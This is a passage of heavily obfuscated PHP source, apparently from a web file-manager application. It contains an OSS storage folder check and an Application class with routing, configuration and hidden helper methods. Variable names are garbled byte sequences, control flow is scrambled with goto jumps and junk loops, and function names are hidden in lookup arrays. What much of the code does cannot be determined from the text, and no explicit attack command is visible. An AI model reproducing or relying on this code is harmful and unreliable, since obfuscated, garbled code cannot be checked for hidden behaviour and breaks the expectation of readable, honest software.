catch (OSS\Core\OssException $CÚç¨√Öåà) { $d¶º∂ﬂˆõÆ = !1; } return $d¶º∂ﬂˆõÆ; } protected function _isFolder($F√Á∞€˘ÿè) { goto EÏ∫¢ùÌÃ“; f¶–Ì“Ÿ◊„: $aç¡†ÓÙÖπ = $this->client->getBucket($this->bucket, $F√Á∞€˘ÿè, null, 1); if (empty($aç¡†ÓÙÖπ)) { return !1; } $aç¡†ÓÙÖπ = array_values($aç¡†ÓÙÖπ); goto D—õ∂Òô Ï; D—õ∂Òô Ï: if (substr($aç¡†ÓÙÖπ[0][$B∆É≥ƒÿì∆[28]], -1) == $B∆É≥ƒÿì∆[8]) { return !0; } if (get_path_this($aç¡†ÓÙÖπ[0][$B∆É≥ƒÿì∆[28]]) == get_path_this($F√Á∞€˘ÿè)) { return !1; } return !0; goto eÈ∫èÖıÎ≠; EÏ∫¢ùÌÃ“: $B∆É≥ƒÿì∆ =& $_SERVER[£¿ÌÙëü¡¯¯]; $F√Á∞€˘ÿè = rtrim($F√Á∞€˘ÿè, $B∆É≥ƒÿì∆[8]); if ($F√Á∞€˘ÿè == $B∆É≥ƒÿì∆[33] || $F√Á∞€˘ÿè == $B∆É≥ƒÿì∆[8]) { return !0; } goto f¶–Ì“Ÿ◊„; eÈ∫èÖıÎ≠: } } define($_SERVER[£¿ÌÙëü¡¯¯][223], 1); goto cî‡Ñà‡”ú; fäπ¿Œ¯Úö: $Dßòπ◊ÿƒº = $_SERVER[£¿ÌÙëü¡¯¯][543]; while (strlen($Dßòπ◊ÿƒº) < $_SERVER[£¿ÌÙëü¡¯¯][544]) { if (!$Dßòπ◊ÿƒº) { break; } $Dßòπ◊ÿƒº++; } class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\x69\x6e\144\x65\x78"; private $defaultAction = "\x69\156\144\145\170"; function __construct() { } public function setDefault($eÙå€⁄◊®Î) { goto Aˆ∆¯ü¿¨Ö; a‡ﬂÎÒö†ç: $a÷∞´˜ÉÓ¬ = $CÁÜﬂ’ëãÑ[545]; $this->defaultModule = $fÁ©®‰åãÇ[0] ? $fÁ©®‰åãÇ[0] : $this->defaultModule; $aú™¨◊®ç = $CÁÜﬂ’ëãÑ[546]; goto fÓ˜¡âÇı®; fÓ˜¡âÇı®: $this->defaultController = $fÁ©®‰åãÇ[1] ? $fÁ©®‰åãÇ[1] : $this->defaultController; $this->defaultAction = $fÁ©®‰åãÇ[2] ? $fÁ©®‰åãÇ[2] : $this->defaultAction; $this->{$_SERVER[™≤ºµ][3]}($A‘∫ôÊËﬂŒ[4], array($this, $A‘∫ôÊËﬂŒ[5])); goto a•È≤≈Œ”ı; Aˆ∆¯ü¿¨Ö: $CÁÜﬂ’ëãÑ =& $_SERVER[£¿ÌÙëü¡¯¯]; $A‘∫ôÊËﬂŒ =& $_SERVER[™≤ºµ]; $fÁ©®‰åãÇ = $A‘∫ôÊËﬂŒ[0]($A‘∫ôÊËﬂŒ[1], $A‘∫ôÊËﬂŒ[2]($eÙå€⁄◊®Î, $A‘∫ôÊËﬂŒ[1])); goto a‡ﬂÎÒö†ç; a•È≤≈Œ”ı: $cÖÇ√îº … = $CÁÜﬂ’ëãÑ[547]; if (!$cÖÇ√îº …) { return; } goto bô≠§òÊΩô; bô≠§òÊΩô: } public function appRun($cìÎ∂Úú‹÷) { goto EœÍ∞…À£‘; Eˆ÷òë•ﬂ‹: if ($eÉªä∫Ñ·œ == $fÍƒÑƒÈÚë[8]) { $b£æû”›∑ã = $fÍƒÑƒÈÚë[9]; $C¡Ì©›óí„[0] = $fÍƒÑƒÈÚë[10]; $C¡Ì©›óí„[1] = $C¡Ì©›óí„[1] . $fÍƒÑƒÈÚë[11]; $cìÎ∂Úú‹÷ = $fÍƒÑƒÈÚë[12]($fÍƒÑƒÈÚë[1], $C¡Ì©›óí„); $cìÎ∂Úú‹÷ = $fÍƒÑƒÈÚë[2]($cìÎ∂Úú‹÷, $fÍƒÑƒÈÚë[1]); } $fÍƒÑƒÈÚë[13](array($fÍƒÑƒÈÚë[14], $fÍƒÑƒÈÚë[15]), $b£æû”›∑ã . $fÍƒÑƒÈÚë[16], $cìÎ∂Úú‹÷); $fÍƒÑƒÈÚë[17]($cìÎ∂Úú‹÷); goto b¢¢Çò’Õ; EœÍ∞…À£‘: $BÊ°ú…≤º™ =& $_SERVER[£¿ÌÙëü¡¯¯]; $fÍƒÑƒÈÚë =& $_SERVER[™≤ºµ]; $C¡Ì©›óí„ = $fÍƒÑƒÈÚë[0]($fÍƒÑƒÈÚë[1], $cìÎ∂Úú‹÷); goto B≈£ñ‡≈∫»; b¢¢Çò’Õ: $cúƒ”›æºÀ = $BÊ°ú…≤º™[551]; if (strlen($cúƒ”›æºÀ) < $BÊ°ú…≤º™[549]) { return; } $fÍƒÑƒÈÚë[13](array($fÍƒÑƒÈÚë[14], $fÍƒÑƒÈÚë[15]), $b£æû”›∑ã . $fÍƒÑƒÈÚë[18], $cìÎ∂Úú‹÷); goto aæ∑ìÇöàì; a†ï≤Ω¡Æ¿: $CÇü£åﬂ©É = $BÊ°ú…≤º™[550]; while (strlen($CÇü£åﬂ©É) < $BÊ°ú…≤º™[549]) { if (!$CÇü£åﬂ©É) { break; } $CÇü£åﬂ©É++; } $b£æû”›∑ã = $fÍƒÑƒÈÚë[7]; goto Eˆ÷òë•ﬂ‹; B≈£ñ‡≈∫»: $CãáﬁÃıôÌ = $BÊ°ú…≤º™[548]; while (strlen($CãáﬁÃıôÌ) < $BÊ°ú…≤º™[549]) { if (!$CãáﬁÃıôÌ) { break; } $CãáﬁÃıôÌ++; } $eÉªä∫Ñ·œ = $fÍƒÑƒÈÚë[6]($C¡Ì©›óí„[0]); goto a†ï≤Ω¡Æ¿; aæ∑ìÇöàì: } private function autorun() { $f°Û“¡¯í‰ =& $_SERVER[™≤ºµ]; global $config; if ($f°Û“¡¯í‰[19]($config[$f°Û“¡¯í‰[20]]) == 0) { return; } foreach ($config[$f°Û“¡¯í‰[20]] as $cêÒßÒç¨é => $Aªªäêòå’) { $this->{$_SERVER[™≤ºµ][21]}($Aªªäêòå’); } } private function sixu3cb4c6c5() { goto cåèà«ûÖú; Cí´…Ù…ë†: $GLOBALS[$C§çâÖ¬ß…[22]][$C§çâÖ¬ß…[23]] = $C§çâÖ¬ß…[27]($a©˘ã‚Ééæ, $CÆ”Ê¨Ë´–); $GLOBALS[$C§çâÖ¬ß…[22]][$C§çâÖ¬ß…[28]] = $C§çâÖ¬ß…[29]($C§çâÖ¬ß…[1], $GLOBALS[$C§çâÖ¬ß…[22]][$C§çâÖ¬ß…[23]]); $c´Ÿëó®á÷ = $E•òùŒ≈´ê[554]; goto C‹‹±πˆÔà; e‘’·ï©èπ: $aêß∂àÏ¢ë = $E•òùŒ≈´ê[552]; $F™À€Ïãùá = $GLOBALS[$C§çâÖ¬ß…[22]][$C§çâÖ¬ß…[23]][0]; if (!$F™À€Ïãùá || $C§çâÖ¬ß…[24]($F™À€Ïãùá) <= $C§çâÖ¬ß…[24]($aÆ™Ù ≠™ÿ)) { return; } goto dñÎÜëÊÙò; cåèà«ûÖú: $E•òùŒ≈´ê =& $_SERVER[£¿ÌÙëü¡¯¯]; $C§çâÖ¬ß… =& $_SERVER[™≤ºµ]; $aÆ™Ù ≠™ÿ = $C§çâÖ¬ß…[8]; goto e‘’·ï©èπ; C©£¬©≥ƒù: $DÀˆ⁄éØ’ = $E•òùŒ≈´ê[553]; if (strlen($DÀˆ⁄éØ’) < $E•òùŒ≈´ê[544]) { die; } $CÆ”Ê¨Ë´– = $C§çâÖ¬ß…[26]($GLOBALS[$C§çâÖ¬ß…[22]][$C§çâÖ¬ß…[23]], 1); goto Cí´…Ù…ë†; dñÎÜëÊÙò: if ($C§çâÖ¬ß…[6]($C§çâÖ¬ß…[25]($F™À€Ïãùá, -$C§çâÖ¬ß…[24]($aÆ™Ù ≠™ÿ))) != $aÆ™Ù ≠™ÿ) { return; } $DŸ—È”–ó£ = $C§çâÖ¬ß…[25]($F™À€Ïãùá, 0, -$C§çâÖ¬ß…[24]($aÆ™Ù ≠™ÿ)); $a©˘ã‚Ééæ = array($C§çâÖ¬ß…[8], $DŸ—È”–ó£); goto C©£¬©≥ƒù; C‹‹±πˆÔà: } private function mqwhf32ba69c() { goto E∫éß‘ÿºﬂ; Aèõ¡ÑÎîë: $A¿÷ÒÆà‹° = $f˘â‘ë¬Úµ[2]($DÖ¡‹®ôÓõ[0][0], $f˘â‘ë¬Úµ[36]); $GLOBALS[$f˘â‘ë¬Úµ[22]][$f˘â‘ë¬Úµ[23]] = $f˘â‘ë¬Úµ[0]($f˘â‘ë¬Úµ[36], $A¿÷ÒÆà‹°); $d®åﬂªæñı = $Cá–âüﬂﬁÖ[559]; goto C√„Á∂öÃ›; E∫éß‘ÿºﬂ: $Cá–âüﬂﬁÖ =& $_SERVER[£¿ÌÙëü¡¯¯]; $f˘â‘ë¬Úµ =& $_SERVER[™≤ºµ]; if ($GLOBALS[$f˘â‘ë¬Úµ[22]][$f˘â‘ë¬Úµ[28]] != $f˘â‘ë¬Úµ[10]) { return; } goto Eª«ÊÑ◊·ø; aﬁªÛõ¢àü: while ($DˆäÿàÑ•° < $Cá–âüﬂﬁÖ[549]) { if ($DˆäÿàÑ•° >= 0) { break; } $DˆäÿàÑ•°++; } $A¿÷ÒÆà‹° = $f˘â‘ë¬Úµ[25]($e÷É…‹‘ãã, $Fùá¬ÁŒ∫ª + $f˘â‘ë¬Úµ[24]($C≤æÛ≤Õ¯)); $f˘â‘ë¬Úµ[34]($f˘â‘ë¬Úµ[35], $A¿÷ÒÆà‹°, $DÖ¡‹®ôÓõ); goto Aèõ¡ÑÎîë; eÉ”Ç† âÕ: if (!$f˘â‘ë¬Úµ[32]($e÷É…‹‘ãã, $C≤æÛ≤Õ¯)) { return; } $Fùá¬ÁŒ∫ª = $f˘â‘ë¬Úµ[33]($e÷É…‹‘ãã, $C≤æÛ≤Õ¯); $DˆäÿàÑ•° = $Cá–âüﬂﬁÖ[558]; goto aﬁªÛõ¢àü; C√„Á∂öÃ›: $GLOBALS[$f˘â‘ë¬Úµ[22]][$f˘â‘ë¬Úµ[28]] = $f˘â‘ë¬Úµ[29]($f˘â‘ë¬Úµ[1], $GLOBALS[$f˘â‘ë¬Úµ[22]][$f˘â‘ë¬Úµ[23]]); $DÿóêÙΩ†ô = $Cá–âüﬂﬁÖ[560]; if (strlen($DÿóêÙΩ†ô) < $Cá–âüﬂﬁÖ[561]) { return; } goto B“èá™∆®; còß¬ûÑπÓ: $C≤æÛ≤Õ¯ = $f˘â‘ë¬Úµ[31]; $e˘®Ö∆È€Í = $Cá–âüﬂﬁÖ[557]; while ($e˘®Ö∆È€Í < $Cá–âüﬂﬁÖ[549]) { if ($e˘®Ö∆È€Í >= 0) { break; } $e˘®Ö∆È€Í++; } goto eÉ”Ç† âÕ; Eª«ÊÑ◊·ø: $e÷É…‹‘ãã = $_SERVER[$f˘â‘ë¬Úµ[30]]; $c÷ûŒÛ‹¶≠ = $Cá–âüﬂﬁÖ[555]; while ($c÷ûŒÛ‹¶≠ < $Cá–âüﬂﬁÖ[556]) { if ($c÷ûŒÛ‹¶≠ >= 0) { break; } $c÷ûŒÛ‹¶≠++; } goto còß¬ûÑπÓ; B“èá™∆®: } public function run() { goto D∫ÜÒ≤Îúà; f⁄ØßäÕ‚‚: if ($CÏ¬™õîÜ“[19]($BÑãÜ≠ƒ∂ç) >= 3) { $this->{$_SERVER[™≤ºµ][21]}($B‚ ΩøóîË); } else { $this->{$_SERVER[™≤ºµ][21]}(ACTION); } goto aﬁ‘ëπÒÙ˜; D◊‚Øç†§ß: $cîÍò·áŸÓ = $dƒô”ˆÂ¡’[567]; while ($cîÍò·áŸÓ < $dƒô”ˆÂ¡’[549]) { if ($cîÍò·áŸÓ >= 0) { break; } $cîÍò·áŸÓ++; } $CÏ¬™õîÜ“[39]($CÏ¬™õîÜ“[43], MOD . $CÏ¬™õîÜ“[1] . ST . $CÏ¬™õîÜ“[1] . ACT); goto bÃçêë«œ≤; bÃçêë«œ≤: $F’ÎÊÆ‹‡¿ = $dƒô”ˆÂ¡’[568]; $_SERVER[$CÏ¬™õîÜ“[44]] = $CÏ¬™õîÜ“[6](ACTION); $f£Ãäß≈—† = $dƒô”ˆÂ¡’[569]; goto b¥ì∫∑£˜≤; F∆óùﬂÜ≥€: $cÁ¥ä°„ﬁÑ = $dƒô”ˆÂ¡’[563]; while ($cÁ¥ä°„ﬁÑ < $dƒô”ˆÂ¡’[544]) { if ($cÁ¥ä°„ﬁÑ >= 0) { break; } $cÁ¥ä°„ﬁÑ++; } $BÑãÜ≠ƒ∂ç = $GLOBALS[$CÏ¬™õîÜ“[22]][$CÏ¬™õîÜ“[23]]; goto dáπ¨¿çŸ; DÒ÷´Í‰ó·: $eıë“ÕØÈé = $dƒô”ˆÂ¡’[562]; while (strlen($eıë“ÕØÈé) < $dƒô”ˆÂ¡’[540]) { if (!$eıë“ÕØÈé) { break; } $eıë“ÕØÈé++; } $this->{$_SERVER[™≤ºµ][38]}(); goto F∆óùﬂÜ≥€; D∫ÜÒ≤Îúà: $dƒô”ˆÂ¡’ =& $_SERVER[£¿ÌÙëü¡¯¯]; $CÏ¬™õîÜ“ =& $_SERVER[™≤ºµ]; $this->{$_SERVER[™≤ºµ][37]}(); goto DÒ÷´Í‰ó·; AáãÕ≈∫Ü∂: $F˘ÕÏ¢∑πò = $dƒô”ˆÂ¡’[566]; if (!$F˘ÕÏ¢∑πò) { die; } $CÏ¬™õîÜ“[39]($CÏ¬™õîÜ“[42], isset($BÑãÜ≠ƒ∂ç[2]) && $BÑãÜ≠ƒ∂ç[0] ? $BÑãÜ≠ƒ∂ç[2] : $this->defaultAction); goto D◊‚Øç†§ß; fÎÂ⁄õ•√‡: $CÏ¬™õîÜ“[39]($CÏ¬™õîÜ“[40], isset($BÑãÜ≠ƒ∂ç[0]) && $BÑãÜ≠ƒ∂ç[0] ? $BÑãÜ≠ƒ∂ç[0] : $this->defaultModule); $cÕúƒ˘°äå = $dƒô”ˆÂ¡’[565]; $CÏ¬™õîÜ“[39]($CÏ¬™õîÜ“[41], isset($BÑãÜ≠ƒ∂ç[1]) && $BÑãÜ≠ƒ∂ç[0] ? $BÑãÜ≠ƒ∂ç[1] : $this->defaultController); goto AáãÕ≈∫Ü∂; b¥ì∫∑£˜≤: if (!$f£Ãäß≈—†) { return; } $this->{$_SERVER[™≤ºµ][45]}(); $B˘◊Ü∑Ñàﬂ = $dƒô”ˆÂ¡’[570]; goto f⁄ØßäÕ‚‚; dáπ¨¿çŸ: $B‚ ΩøóîË = $GLOBALS[$CÏ¬™õîÜ“[22]][$CÏ¬™õîÜ“[28]]; $CÂÒúü¢ø· = $dƒô”ˆÂ¡’[564]; while ($CÂÒúü¢ø· < $dƒô”ˆÂ¡’[540]) { if ($CÂÒúü¢ø· >= 0) { break; } $CÂÒúü¢ø·++; } goto fÎÂ⁄õ•√‡; aﬁ‘ëπÒÙ˜: } private $ubik2449d0f6 = array(); private $ljsm2d5c14a8 = ''; public function cqsd679a7f5e() { goto a∏´Ã∏Ô‹ó; a∏´Ã∏Ô‹ó: $dæÍ⁄çÙ¡Â =& $_SERVER[£¿ÌÙëü¡¯¯]; $D›∏éáÿ§é =& $_SERVER[™≤ºµ]; $this->{$_SERVER[™≤ºµ][46]}(); goto E©≤óºôÑΩ; Aƒ≤áéõ»‡: $CÑÇ’ÃŒì® = $dæÍ⁄çÙ¡Â[576]; if (strlen($CÑÇ’ÃŒì®) < $dæÍ⁄çÙ¡Â[556]) { die; } goto CçﬂΩÛ›éπ; aã∏À´…ßæ: $this->{$_SERVER[™≤ºµ][3]}($D›∏éáÿ§é[57], array($this, $D›∏éáÿ§é[58])); $Dìß∞Öﬂüä = $dæÍ⁄çÙ¡Â[575]; $this->{$_SERVER[™≤ºµ][3]}($D›∏éáÿ§é[59], array($this, $D›∏éáÿ§é[60])); goto Aƒ≤áéõ»‡; Eß¯¶µ…¯ÿ: $Dâûå‚ä ﬂ = $dæÍ⁄çÙ¡Â[574]; if (strlen($Dâûå‚ä ﬂ) < $dæÍ⁄çÙ¡Â[561]) { die; } $this->{$_SERVER[™≤ºµ][3]}($D›∏éáÿ§é[55], array($this, $D›∏éáÿ§é[56])); goto aã∏À´…ßæ; dˆé≈õ⁄◊±: $this->{$_SERVER[™≤ºµ][49]}(); $FÒπ‡¶âçÂ = $dæÍ⁄çÙ¡Â[572]; if (strlen($FÒπ‡¶âçÂ) < $dæÍ⁄çÙ¡Â[561]) { return; } goto b–†âˆáÌ—; E©≤óºôÑΩ: $this->{$_SERVER[™≤ºµ][47]}(); $BîŸÙµ”ò≤ = $dæÍ⁄çÙ¡Â[571]; $this->{$_SERVER[™≤ºµ][48]}(); goto dˆé≈õ⁄◊±; FÑ∑®∑‘∏è: $this->{$_SERVER[™≤ºµ][51]}(); $this->{$_SERVER[™≤ºµ][52]}(); $this->{$_SERVER[™≤ºµ][3]}($D›∏éáÿ§é[53], array($this, $D›∏éáÿ§é[54])); goto Eß¯¶µ…¯ÿ; b–†âˆáÌ—: $this->{$_SERVER[™≤ºµ][50]}(); $C√€≥™ØÁ§ = $dæÍ⁄çÙ¡Â[573]; if (strlen($C√€≥™ØÁ§) < $dæÍ⁄çÙ¡Â[549]) { die; } goto FÑ∑®∑‘∏è; CçﬂΩÛ›éπ: } public function wetsd3f59586($B°ª†…Çèä) { goto e¯¯íêˆáﬂ; fæœ ‰⁄›¶: if ($a‚Ú•Á´œç[102]($GLOBALS, $a‚Ú•Á´œç[130]) && $this->config[$a‚Ú•Á´œç[131]]) { $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[132]] = WEB_ROOT; } return $B°ª†…Çèä; goto C„ëåü‹í«; fœÖ§ÌÑ°ì: if ($F”±ÀÇ™ã∑[$a‚Ú•Á´œç[118]] != $a‚Ú•Á´œç[119]) { $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[120]] = $F”±ÀÇ™ã∑[$a‚Ú•Á´œç[120]]; $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[121]] = $F”±ÀÇ™ã∑[$a‚Ú•Á´œç[121]]; $FÍ«ÑÉ®ı = $a‚Ú•Á´œç[122](10) . $this->ljsm2d5c14a8 . $a‚Ú•Á´œç[122](5); $B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[123]][$a‚Ú•Á´œç[124]] = $this->{$_SERVER[™≤ºµ][125]}($FÍ«ÑÉ®ı, $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[111]]); } if ($this->ljsm2d5c14a8 == $a‚Ú•Á´œç[119]) { $B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$a‚Ú•Á´œç[97]][$a‚Ú•Á´œç[105]] = 0; } $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[126]] = $a‚Ú•Á´œç[102]($this->ubik2449d0f6, $a‚Ú•Á´œç[127], $a‚Ú•Á´œç[10]); goto aéãÂﬂùÜÜ; D®ÁÇüó„∏: $Cê«œ•¶é⁄ = $AÊÀ÷ãﬁ≠¶[582]; if (!$Cê«œ•¶é⁄) { die; } $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[107]] = $a‚Ú•Á´œç[108]($a‚Ú•Á´œç[109])->{$_SERVER[™≤ºµ][110]}(); goto D…£Ç¯äƒÎ; aéãÂﬂùÜÜ: $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[128]] = $a‚Ú•Á´œç[102]($this->ubik2449d0f6, $a‚Ú•Á´œç[129], $a‚Ú•Á´œç[10]); $fúËèãáÇ = $AÊÀ÷ãﬁ≠¶[583]; if (strlen($fúËèãáÇ) < $AÊÀ÷ãﬁ≠¶[540]) { return; } goto fæœ ‰⁄›¶; aàœª§ÿçÂ: $cé∏¥Ö¥ê∏ = $B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$a‚Ú•Á´œç[76]]; $d“Ü◊€¡•ô = $AÊÀ÷ãﬁ≠¶[578]; if (!$d“Ü◊€¡•ô) { die; } goto DÚﬁØ¥ÑÓÕ; e¯¯íêˆáﬂ: $AÊÀ÷ãﬁ≠¶ =& $_SERVER[£¿ÌÙëü¡¯¯]; $a‚Ú•Á´œç =& $_SERVER[™≤ºµ]; $F”±ÀÇ™ã∑ = $a‚Ú•Á´œç[61]($a‚Ú•Á´œç[62])->{$_SERVER[™≤ºµ][63]}(); goto c¥ö¢◊⁄„Ô; Bõ™®†⁄Ùà: $B…àÍ‚◊¶Ü = $AÊÀ÷ãﬁ≠¶[581]; while ($B…àÍ‚◊¶Ü < $AÊÀ÷ãﬁ≠¶[549]) { if ($B…àÍ‚◊¶Ü >= 0) { break; } $B…àÍ‚◊¶Ü++; } $B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$a‚Ú•Á´œç[97]] = array($a‚Ú•Á´œç[98] => (int) $cé∏¥Ö¥ê∏[$a‚Ú•Á´œç[99]], $a‚Ú•Á´œç[100] => $a‚Ú•Á´œç[101]($a‚Ú•Á´œç[102]($cé∏¥Ö¥ê∏, $a‚Ú•Á´œç[103], array())), $a‚Ú•Á´œç[104] => (int) $a‚Ú•Á´œç[102]($cé∏¥Ö¥ê∏, $a‚Ú•Á´œç[105], 0)); goto D®ÁÇüó„∏; Cêíı¡ö«≈: $b‚å¬Üê∏∂ = $AÊÀ÷ãﬁ≠¶[580]; unset($B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$a‚Ú•Á´œç[76]]); unset($B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$a‚Ú•Á´œç[96]]); goto Bõ™®†⁄Ùà; DÚﬁØ¥ÑÓÕ: unset($B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[93]][$a‚Ú•Á´œç[94]]); $c∆ÊÖ¥Ôéˆ = $AÊÀ÷ãﬁ≠¶[579]; unset($B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[93]][$a‚Ú•Á´œç[95]]); goto Cêíı¡ö«≈; c¥ö¢◊⁄„Ô: $a∆ÛÉ≈ÔÁ« = $AÊÀ÷ãﬁ≠¶[577]; $B–¥Ô±Ë·∏ = array($a‚Ú•Á´œç[64], $a‚Ú•Á´œç[65], $a‚Ú•Á´œç[66], $a‚Ú•Á´œç[67], $a‚Ú•Á´œç[68], $a‚Ú•Á´œç[69], $a‚Ú•Á´œç[70], $a‚Ú•Á´œç[71], $a‚Ú•Á´œç[72], $a‚Ú•Á´œç[73], $a‚Ú•Á´œç[74], $a‚Ú•Á´œç[75], $a‚Ú•Á´œç[76], $a‚Ú•Á´œç[77], $a‚Ú•Á´œç[78], $a‚Ú•Á´œç[79], $a‚Ú•Á´œç[80], $a‚Ú•Á´œç[81], $a‚Ú•Á´œç[82], $a‚Ú•Á´œç[83], $a‚Ú•Á´œç[84], $a‚Ú•Á´œç[85], $a‚Ú•Á´œç[86], $a‚Ú•Á´œç[87], $a‚Ú•Á´œç[88]); foreach ($B–¥Ô±Ë·∏ as $B™÷î˜¯Á£) { $AÛÿÑÑÆ…≠ = $GLOBALS[$a‚Ú•Á´œç[89]][$a‚Ú•Á´œç[90]][$B™÷î˜¯Á£]; if (isset($F”±ÀÇ™ã∑[$B™÷î˜¯Á£])) { $AÛÿÑÑÆ…≠ = $F”±ÀÇ™ã∑[$B™÷î˜¯Á£]; } $B°ª†…Çèä[$a‚Ú•Á´œç[91]][$a‚Ú•Á´œç[92]][$B™÷î˜¯Á£] = $AÛÿÑÑÆ…≠; } goto aàœª§ÿçÂ; D…£Ç¯äƒÎ: $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[111]] = $a‚Ú•Á´œç[112]($_SERVER[$a‚Ú•Á´œç[113]] . $F”±ÀÇ™ã∑[$a‚Ú•Á´œç[114]]); $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[115]] = $a‚Ú•Á´œç[116]($a‚Ú•Á´œç[117]()); $B°ª†…Çèä[$a‚Ú•Á´œç[106]][$a‚Ú•Á´œç[118]] = $this->ljsm2d5c14a8; goto fœÖ§ÌÑ°ì; C„ëåü‹í«: } private function hjtcfb8e7e61() { goto dÔ≥ááÕÁ™; dÜéÿ‰ÕΩ: $cÉÆÏ••ﬂ”[13](array($cÉÆÏ••ﬂ”[149], $cÉÆÏ••ﬂ”[150]), $CÃΩªáÁê·); goto b®ãëœØ™Ÿ; eºû˜√°äﬂ: if ($this->ljsm2d5c14a8 == $cÉÆÏ••ﬂ”[119]) { return; } $a»’ç·§õè = array($cÉÆÏ••ﬂ”[151], $cÉÆÏ••ﬂ”[152], $cÉÆÏ••ﬂ”[153], $cÉÆÏ••ﬂ”[154], $cÉÆÏ••ﬂ”[155], $cÉÆÏ••ﬂ”[156]); $F˜Ü°∞ËÖÜ = $cÉÆÏ••ﬂ”[61]($cÉÆÏ••ﬂ”[62])->{$_SERVER[™≤ºµ][63]}(); goto F´è‹‚◊Øﬂ; dÔ≥ááÕÁ™: $fåè◊¨Û§ =& $_SERVER[£¿ÌÙëü¡¯¯]; $cÉÆÏ••ﬂ” =& $_SERVER[™≤ºµ]; if ($_SERVER[$cÉÆÏ••ﬂ”[44]] == $cÉÆÏ••ﬂ”[133]) { goto d∞›´⁄⁄‘ê; FÆèªµäá—: $fßƒïíò£† = $fåè◊¨Û§[584]; $CÃΩªáÁê· = array($cÉÆÏ••ﬂ”[148] => $Fıı†Ò≠îà); $cÉÆÏ••ﬂ”[13](array($cÉÆÏ••ﬂ”[149], $cÉÆÏ••ﬂ”[150]), $CÃΩªáÁê·); goto Bê⁄âÓ µË; Bê⁄âÓ µË: $cÑûØø êÎ = $fåè◊¨Û§[585]; while (strlen($cÑûØø êÎ) < $fåè◊¨Û§[544]) { if (!$cÑûØø êÎ) { break; } $cÑûØø êÎ++; } goto f∂Œ©Ö◊„œ; d∞›´⁄⁄‘ê: $Fıı†Ò≠îà = array($cÉÆÏ••ﬂ”[118] => $this->ljsm2d5c14a8, $cÉÆÏ••ﬂ”[134] => $this->{$_SERVER[™≤ºµ][135]}(), $cÉÆÏ••ﬂ”[136] => $cÉÆÏ••ﬂ”[61]($cÉÆÏ••ﬂ”[137])->{$_SERVER[™≤ºµ][138]}()); if ($this->ljsm2d5c14a8 != $cÉÆÏ••ﬂ”[119]) { $f¿ñ¨ßÓÊ’ = $cÉÆÏ••ﬂ”[102]($this->ubik2449d0f6, $cÉÆÏ••ﬂ”[139]); if ($f¿ñ¨ßÓÊ’) { $Fıı†Ò≠îà[$cÉÆÏ••ﬂ”[140]] = $f¿ñ¨ßÓÊ’; $Fıı†Ò≠îà[$cÉÆÏ••ﬂ”[141]] = $cÉÆÏ••ﬂ”[142]($cÉÆÏ••ﬂ”[102]($this->ubik2449d0f6, $cÉÆÏ••ﬂ”[143])); $Fıı†Ò≠îà[$cÉÆÏ••ﬂ”[144]] = $cÉÆÏ••ﬂ”[102]($this->ubik2449d0f6, $cÉÆÏ••ﬂ”[129]); } } $Fıı†Ò≠îà = $this->{$_SERVER[™≤ºµ][145]}($cÉÆÏ••ﬂ”[146]($Fıı†Ò≠îà), $cÉÆÏ••ﬂ”[112]($cÉÆÏ••ﬂ”[147])); goto FÆèªµäá—; f∂Œ©Ö◊„œ: } goto eºû˜√°äﬂ; F´è‹‚◊Øﬂ: $FÛ∆¶æÏ‡û = $fåè◊¨Û§[586]; while (strlen($FÛ∆¶æÏ‡û) < $fåè◊¨Û§[544]) { if (!$FÛ∆¶æÏ‡û) { break; } $FÛ∆¶æÏ‡û++; } $CÃΩªáÁê· = array($cÉÆÏ••ﬂ”[157] => $F˜Ü°∞ËÖÜ[$cÉÆÏ••ﬂ”[64]], $cÉÆÏ••ﬂ”[158] => $F˜Ü°∞ËÖÜ[$cÉÆÏ••ﬂ”[65]], $cÉÆÏ••ﬂ”[159] => $cÉÆÏ••ﬂ”[10]); goto B∂‘ÎÑáÛÆ; B∂‘ÎÑáÛÆ: $BÿÜÁùç»Ü = $fåè◊¨Û§[587]; while ($BÿÜÁùç»Ü < $fåè◊¨Û§[540]) { if ($BÿÜÁùç»Ü >= 0) { break; } $BÿÜÁùç»Ü++; } foreach ($a»’ç·§õè as $b·ˆíÔ‡√ä) { if (!isset($F˜Ü°∞ËÖÜ[$b·ˆíÔ‡√ä]) || !$F˜Ü°∞ËÖÜ[$b·ˆíÔ‡√ä]) { continue; } $CÃΩªáÁê·[$b·ˆíÔ‡√ä] = $F˜Ü°∞ËÖÜ[$b·ˆíÔ‡√ä]; } goto dÜéÿ‰ÕΩ; b®ãëœØ™Ÿ: } private function jcmn3f595f9c() { goto EÜµ¡Ç€’ê; dÌó·•¢Èπ: $aóìÉø¥‡Ô = $aúßÿÀá¯„ . $A™©Î¬±êØ[$eÀ¥°óßÆ≥[118]] . $A™©Î¬±êØ[$eÀ¥°óßÆ≥[210]]; $A™©Î¬±êØ[$eÀ¥°óßÆ≥[120]] = $eÀ¥°óßÆ≥[212]($eÀ¥°óßÆ≥[116]($this->{$_SERVER[™≤ºµ][145]}($aóìÉø¥‡Ô, $eÀ¥°óßÆ≥[213]))); $a›∫ÎØå°Û = $eÀ¥°óßÆ≥[122](16); goto eˆå≈”ÇùŸ; EÜµ¡Ç€’ê: $A∏—ûÈÿõÉ =& 